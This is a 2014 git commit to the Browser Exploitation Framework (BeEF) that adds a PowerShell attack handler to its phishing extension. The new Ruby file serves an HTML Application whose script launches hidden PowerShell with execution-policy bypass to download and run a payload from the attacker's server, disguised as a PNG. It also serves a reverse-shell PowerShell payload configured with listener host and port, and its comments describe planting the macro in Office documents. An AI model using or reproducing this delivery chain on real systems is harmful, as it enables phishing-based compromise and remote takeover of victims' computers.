bc56be0a7f0a312907ee79ff61f5af6caa6342fd
antisnatchor <antisnatchor@gmail.com>
2014-09-08 14:07:09 +0200

    Added a generic handler for powershell-related attacks.

--- extensions/social_engineering/extension.rb
+++ extensions/social_engineering/extension.rb
@@ -4,30 +4,34 @@
 # See the file 'doc/COPYING' for copying permission
 #
 module BeEF
-module Extension
+  module Extension
 
-  module RegisterSEngHandler
-    def self.mount_handler(server)
-      server.mount('/api/seng', BeEF::Extension::SocialEngineering::SEngRest.new)
+    module RegisterSEngHandler
+      def self.mount_handler(server)
+        server.mount('/api/seng', BeEF::Extension::SocialEngineering::SEngRest.new)
+
+        ps_url = BeEF::Core::Configuration.instance.get('beef.extension.social_engineering.powershell.powershell_handler_url')
+        server.mount("#{ps_url}", BeEF::Extension::SocialEngineering::Bind_powershell.new)
+      end
+    end
+
+    module SocialEngineering
+      extend BeEF::API::Extension
+
+      @short_name = 'social_engineering'
+      @full_name = 'Social Engineering'
+      @description = 'Phishing attacks for your pleasure: web page cloner (POST interceptor and BeEF goodness), highly configurable mass mailer, powershell-related attacks, etc.'
+
+      BeEF::API::Registrar.instance.register(BeEF::Extension::RegisterSEngHandler, BeEF::API::Server, 'mount_handler')
     end
   end
-
-  module SocialEngineering
-    extend BeEF::API::Extension
-
-    @short_name = 'social_engineering'
-    @full_name = 'Social Engineering'
-    @description = 'Phishing attacks for your pleasure: web page cloner (POST interceptor and BeEF goodness), highly configurable mass mailer, etc.'
-
-    BeEF::API::Registrar.instance.register(BeEF::Extension::RegisterSEngHandler, BeEF::API::Server, 'mount_handler')
-  end
-end
 end
 
 # Handlers
 require 'extensions/social_engineering/web_cloner/web_cloner'
 require 'extensions/social_engineering/web_cloner/interceptor'
 require 'extensions/social_engineering/mass_mailer/mass_mailer'
+require 'extensions/social_engineering/powershell/bind_powershell'
 
 # Models
 require 'extensions/social_engineering/models/web_cloner'
---
+++ extensions/social_engineering/powershell/bind_powershell.rb
@@ -0,0 +1,61 @@
+#
+# Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
+# Browser Exploitation Framework (BeEF) - http://beefproject.com
+# See the file 'doc/COPYING' for copying permission
+#
+module BeEF
+  module Extension
+    module SocialEngineering
+
+      #
+      # NOTE: the powershell_payload is work/copyright from @mattifestation (kudos for that)
+      # NOTE: the visual-basic macro code inside the Microsoft Office Word/Excel documents is work/copyright from @enigma0x3 (kudos for that)
+      #
+      # If you use the powershell payload for Office documents, make sure you edit the macro inside the sample documents in this directory:
+      # change the payload URL with your BeEF server and powershell URL settings. By default powershell will be served from:
+      # http://beef_server:beef_port/ps/ps.png
+      #
+      # NOTE: make sure you change the 'host' variable in the main BeEF config.yaml from 0.0.0.0 to the specific IP where BeEF is binded to.
+      class Bind_powershell < BeEF::Core::Router::Router
+        before do
+          headers 'Pragma' => 'no-cache',
+                  'Cache-Control' => 'no-cache',
+                  'Expires' => '0'
+        end
+
+        # serves the HTML Application (HTA)
+        get '/hta' do
+          response['Content-Type'] = "application/hta"
+
+          host = BeEF::Core::Configuration.instance.get('beef.http.host')
+          port = BeEF::Core::Configuration.instance.get('beef.http.port')
+          ps_url = BeEF::Core::Configuration.instance.get('beef.extension.social_engineering.powershell.powershell_handler_url')
+          payload_url = "http://#{host}:#{port}#{ps_url}/ps.png"
+
+          print_info "Serving HTA. Powershell payload will be retrieved from: #{payload_url}"
+          "<script>
+                var c = \"cmd.exe /c powershell.exe -w hidden -nop -ep bypass -c \\\"\\\"IEX ((new-object net.webclient).downloadstring('#{payload_url}')); Invoke-ps\\\"\\\"\";
+                new ActiveXObject('WScript.Shell').Run(c);
+            </script>"
+        end
+
+        # serves the powershell payload after modifying LHOST/LPORT
+        # The payload gets served via HTTP by default. Serving it via HTTPS it's still a TODO
+        get '/ps.png' do
+          response['Content-Type'] = "text/plain"
+
+          @ps_lhost = BeEF::Core::Configuration.instance.get('beef.extension.social_engineering.powershell.msf_reverse_handler_host')
+          @ps_port = BeEF::Core::Configuration.instance.get('beef.extension.social_engineering.powershell.msf_reverse_handler_port')
+
+          ps_payload_path = "#{$root_dir}/extensions/social_engineering/powershell/powershell_payload"
+
+          ps_payload = ''
+          if File.exist?(ps_payload_path)
+            ps_payload = File.read(ps_payload_path).gsub("___LHOST___", @ps_lhost).gsub("___LPORT___", @ps_port)
+          end
+          ps_payload
+        end
+      end
+    end
+  end
+end
